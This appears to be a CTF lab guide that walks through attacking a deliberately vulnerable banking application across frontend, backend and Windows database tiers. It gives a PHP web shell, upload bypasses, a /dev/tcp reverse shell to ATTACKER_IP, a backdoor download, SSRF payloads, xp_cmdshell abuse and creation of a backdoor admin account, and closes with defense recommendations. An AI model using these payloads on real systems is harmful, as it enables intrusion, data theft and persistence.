# Modern Bank - CTF Lab: Kill Chain & Exploitation Guide

## Overview

This is a deliberately vulnerable 3-tier banking application designed for cybersecurity training, penetration testing, and CTF competitions. The architecture demonstrates real-world lateral movement techniques and network segmentation attacks.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                          ATTACK WORKFLOW                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ┌──────────────────┐      ┌──────────────────┐     ┌────────────┐ │
│  │  FRONTEND TIER   │      │  BACKEND TIER    │     │ DATABASE   │ │
│  │  (Ubuntu LTS)    │      │  (Ubuntu 24)     │     │ (Windows)  │ │
│  │  192.168.1.10    │──→   │  192.168.1.100   │ ──→ │ 192.168.1.50
│  │                  │      │                  │     │            │ │
│  │ • Apache2+PHP    │      │ • Node.js API    │     │ • MSSQL DB │ │
│  │ • Web UI         │      │ • CGI Admin      │     │ • App Data │ │
│  │ • Avatar Upload  │      │ • Credentials    │     │ • Audit    │ │
│  └──────────────────┘      └──────────────────┘     └────────────┘ │
│         ↑                           ↑                       ↑          │
│         │                           │                       │          │
│    ENTRY POINT              PIVOT 1 GATEWAY         PIVOT 2 TARGET  │
│    File Upload              Credentials/SSRF       RCE/Data Access  │
│                                                                       │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Detailed Kill Chain

### PHASE 1: Initial Access (Frontend Tier)

**Target:** Frontend Web Application (Ubuntu LTS)
**Entry Point:** `/profile.php` - Avatar Upload Functionality

#### Vulnerabilities:
1. **Insecure File Upload**
   - Server-side validation checks only file extension
   - No MIME type validation
   - Uploaded files executable in web root
   - Predictable path: `/uploads/{user_id}.jpg`

2. **Exposed Credentials**
   - `.env` file readable from web root
   - Backend SSH credentials: `deploy/DeployPass123!Vulnerable`
   - Windows DB credentials: `Administrator/ModernBank@2024!Admin`
   - Credentials also in `/credentials.txt`

#### Exploitation Steps:

**Step 1: Login** (Required for file upload)
```bash
# Use demo credentials
Username: admin
Password: admin123
# Or: user / user123
```

**Step 2: Create PHP Web Shell**
```php
<?php
system($_GET['cmd']);
?>
```

**Step 3: Bypass File Upload Restrictions**
```bash
# Method 1: Rename to .jpg, upload, and execute via PHP
cp shell.php shell.jpg
# Then access: http://frontend/uploads/1.jpg (PHP executes anyway)

# Method 2: Null byte bypass (older PHP)
cp shell.php "shell.php%00.jpg"

# Method 3: .htaccess upload (if Apache misconfigured)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
```

**Step 4: Upload via cURL**
```bash
curl -b "PHPSESSID=<session>" \
     -F "avatar=@shell.jpg" \
     http://frontend/profile.php
```

**Step 5: Execute Shell**
```bash
# Access uploaded shell
curl "http://frontend/uploads/1.jpg?cmd=id"

# Check user
curl "http://frontend/uploads/1.jpg?cmd=whoami"

# Read .env file
curl "http://frontend/uploads/1.jpg?cmd=cat%20../.env"

# Alternative: Read with PHP
curl "http://frontend/uploads/1.jpg?cmd=cat%20config.php" | grep "define"
```

**Expected Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

BACKEND_SSH_USER=deploy
BACKEND_SSH_PASS=DeployPass123!Vulnerable
BACKEND_IP=192.168.1.100
...
WINDOWS_HOST=192.168.1.50
WINDOWS_USER=Administrator
WINDOWS_PASS=ModernBank@2024!Admin
```

---

### PHASE 2: Lateral Movement - Frontend to Backend

**Pivot Point:** SSH Credentials in `.env`
**Target:** Backend VM (Ubuntu Server 24)

#### Attack Commands:

**Step 1: Establish SSH Connection from Frontend Shell**
```bash
# From web shell on frontend
curl "http://frontend/uploads/1.jpg?cmd=ssh%20-o%20StrictHostKeyChecking=no%20deploy%40192.168.1.100"

# Or use SSH key if available
curl "http://frontend/uploads/1.jpg?cmd=ssh%20-i%20~/.ssh/id_rsa%20deploy%40192.168.1.100"
```

**Step 2: Interactive Shell via Reverse Shell**
```bash
# On attacker machine (listener)
nc -lvnp 4444

# From web shell, create reverse connection
curl "http://frontend/uploads/1.jpg?cmd=bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261"
```

**Step 3: Transfer Shellcode for Persistence**
```bash
# Copy SSH key or backdoor from frontend
curl "http://frontend/uploads/1.jpg?cmd=scp%20~/.ssh/id_rsa%20deploy%40192.168.1.100:~/.ssh/"

# Or use wget/curl to download
curl "http://frontend/uploads/1.jpg?cmd=wget%20http://attacker/backdoor.sh%20-O%20/tmp/bd.sh"
```

**Step 4: Direct Backend Access (if network allows)**
```bash
# Use credentials found in .env
ssh deploy@192.168.1.100 -p 22
# Password: DeployPass123!Vulnerable

# Or non-interactive
echo "whoami" | ssh deploy@192.168.1.100
```

**Expected Success:**
```
$ ssh deploy@192.168.1.100
deploy@backend:~$ whoami
deploy

deploy@backend:~$ cat .env | grep WINDOWS
WINDOWS_HOST=192.168.1.50
WINDOWS_USER=Administrator
WINDOWS_PASS=ModernBank@2024!Admin
```

---

### PHASE 3: Backend Application Exploitation

**Location:** Backend API Server (Node.js)
**Port:** 8080

#### Vulnerable Endpoints:

**1. Configuration Disclosure**
```bash
curl http://192.168.1.100:8080/api/config

# Response includes:
{
  "windows_credentials": {
    "host": "192.168.1.50",
    "username": "Administrator",
    "password": "ModernBank@2024!Admin",
    "database": "ModernBank",
    "port": 1433
  }
}
```

**2. Admin CGI Interface (Unauthenticated RCE)**
```bash
# System information
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=info"

# Execute command
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=exec&cmd=id"

# Read files
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=file&file=/etc/passwd"

# SSH keys enumeration
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=ssh_keys"

# Database connection string
curl "http://192.168.1.100:8080/cgi-bin/admin.php?action=connect_db"
```

**3. SSRF Vulnerability**
```bash
# Access internal services
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "http://192.168.1.50:1433"}'

# Read local files
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "file:///etc/passwd"}'

# Scan internal network
curl -X POST http://192.168.1.100:8080/api/proxy \
     -H "Content-Type: application/json" \
     -d '{"url": "http://192.168.1.0/24:3306"}'
```

**4. Request Logging**
```bash
# View all API requests
curl http://192.168.1.100:8080/api/logs

# May contain credentials or sensitive data from other users
```

---

### PHASE 4: Lateral Movement - Backend to Database VM

**Target:** Windows 10 Database VM (192.168.1.50)
**Services:** MSSQL (1433), RDP (3389), SMB (445)

#### Attack Commands:

**Step 1: Scan for Services**
```bash
# From Backend VM
nmap -sV -p 1433,3389,445 192.168.1.50

# Likely response:
# 1433/tcp   open  mssql        Microsoft SQL Server 2019
# 3389/tcp   open  ms-wbt-server Microsoft Terminal Services
# 445/tcp    open  microsoft-ds  Windows Server 2016+ (running)
```

**Step 2: Connect to MSSQL Database**
```bash
# Install tools if needed
apt-get install -y mssql-tools

# Method 1: Using sqlcmd
sqlcmd -S 192.168.1.50 \
    -U Administrator \
    -P "ModernBank@2024!Admin" \
    -d ModernBank

# Method 2: Using impacket-mssqlclient
impacket-mssqlclient -windows-auth \
    Administrator:'ModernBank@2024!Admin'@192.168.1.50

# Method 3: Using Python
python3 << 'PYTHON'
import pyodbc
conn = pyodbc.connect('Driver={ODBC Driver 17 for SQL Server};'
                     'Server=192.168.1.50;'
                     'UID=Administrator;'
                     'PWD=ModernBank@2024!Admin;'
                     'Database=ModernBank')
PYTHON
```

**Step 3: Query Banking Data**
```sql
-- Connect to database
USE ModernBank;
GO

-- List all users
SELECT * FROM Users;

-- List all accounts with balances
SELECT 
    u.Username,
    a.AccountNumber,
    a.AccountType,
    a.Balance
FROM Users u
JOIN Accounts a ON u.UserID = a.UserID;

-- Extract transactions
SELECT * FROM Transactions;

-- Audit log review
SELECT * FROM AuditLog;

-- Extract credentials from audit log (may contain passwords)
SELECT * FROM AuditLog WHERE Details LIKE '%password%';
```

**Step 4: Privilege Escalation via xp_cmdshell**
```sql
-- Enable advanced options
sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- Execute system commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'tasklist';
EXEC xp_cmdshell 'net user';

-- Create backdoor user
EXEC xp_cmdshell 'net user backdoor P@ssw0rd123 /add';
EXEC xp_cmdshell 'net localgroup Administrators backdoor /add';

-- Enable RDP (if not already enabled)
EXEC xp_cmdshell 'reg add HKLM\System\CurrentControlSet\Control\Terminal^ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f';
```

**Step 5: Complete Compromise**
```bash
# RDP into Windows VM
rdesktop -u Administrator -p "ModernBank@2024!Admin" 192.168.1.50

# Or use xfreerdp
xfreerdp +clipboard /u:Administrator /p:"ModernBank@2024!Admin" /v:192.168.1.50

# Once logged in:
# - Access all files
# - Extract sensitive data
# - Install persistent backdoor
# - Access other systems
# - Exfiltrate database
```

---

## Complete Attack Timeline

| Phase | Time | Action | Access | Result |
|-------|------|--------|--------|--------|
| 1 | 0s | Access Frontend login | Anyone | Session token |
| 1 | 5s | Upload PHP shell | Authenticated user | RCE as www-data |
| 1 | 10s | Read .env file | www-data access | Backend credentials |
| 2 | 15s | SSH to Backend | deploy user | Backend shell |
| 2 | 20s | Check Backend config | Backend user | Windows credentials |
| 3 | 25s | Query /api/config | Network access | Additional creds |
| 4 | 30s | Connect to MSSQL | Network access | Database access |
| 4 | 35s | Enable xp_cmdshell | MSSQL privileges | RCE as MSSQL service |
| 4 | 40s | Create admin user | System access | Backdoor created |
| 4 | 45s | RDP/Physical access | Admin access | Full Windows control |

**Total Time: ~45 seconds from initial access to complete compromise**

---

## Key Vulnerabilities Exploited

1. **File Upload RCE** - Frontend tier entry point
2. **Insecure Storage** - Credentials in readable files
3. **Weak Authentication** - SSH password in plaintext
4. **SSRF** - Backend network access
5. **Unauthenticated Endpoints** - Admin interface without auth
6. **xp_cmdshell** - MSSQL RCE capability
7. **Privilege Escalation** - Insufficient Windows access controls

---

## Defense Recommendations

1. **Input Validation**: Strict file type/content checking
2. **Credentials Management**: Use secrets vault, no hardcoding
3. **Network Segmentation**: Firewall between tiers
4. **Authentication**: MFA on all services
5. **Logging & Monitoring**: Detect suspicious activity
6. **Principle of Least Privilege**: Minimal permissions
7. **Regular Patching**: Keep all systems updated

